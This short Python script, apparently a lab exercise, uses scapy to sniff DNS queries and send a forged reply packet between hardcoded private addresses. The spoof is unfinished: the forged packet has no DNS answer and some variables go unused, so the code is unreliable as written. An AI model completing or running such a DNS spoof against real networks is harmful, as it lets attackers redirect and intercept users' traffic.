#!/usr/bin/python

from scapy.all import *

iface = 'eth0'
hostIP = 'localhost:10000'
hostName = 'www.google.com'

def dnsSniff(pkt):
	if pkt.haslayer(DNS):
		print "untocuhed"
		print pkt.show()

		print "\n FAKE!!!"
                resp = IP(src = '192.168.70.2', dst = '192.168.70.134')/UDP(dport = pkt[UDP].dport, sport = pkt[UDP].sport)
                send(resp)

print iface
print hostIP
print hostName
		
sniff(filter = 'udp dst port 53', prn = dnsSniff, count = 5)


